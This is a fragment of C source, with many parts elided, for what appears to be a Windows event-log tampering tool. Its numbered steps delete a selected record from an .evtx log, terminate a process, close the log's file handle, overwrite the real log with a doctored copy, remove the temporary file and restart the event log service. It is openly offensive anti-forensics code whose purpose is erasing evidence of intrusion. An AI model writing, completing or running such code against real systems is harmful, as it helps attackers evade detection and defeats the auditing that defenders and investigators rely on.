...
int _tmain(int argc, _TCHAR *argv[])
{
	...
	printf("2.Try to Delete Record... ");
	if (DeleteRecord(argv[1], argv[2]))
		printf("Done\n");
	else
	{
	...
	printf("4.Try to TerminateProcess... ");
	...
	printf("5.Try to CloseFileHandle... ");
	...
	printf("6.Try to replace evtx file... ");
	if ((CopyFile(L"Temp.evtx", lpPath, FALSE)) == NULL)
		printf("\n[!]Error,%d\n", GetLastError());
	else
		printf("Done\n");

	printf("7.Try to delete temp.evtx... ");
	if ((DeleteFile(L"Temp.evtx")) == NULL)
		printf("\n[!]Error,%d\n", GetLastError());
	else
		printf("Done\n");

	printf("8.Try to Restart eventlog service...\n");
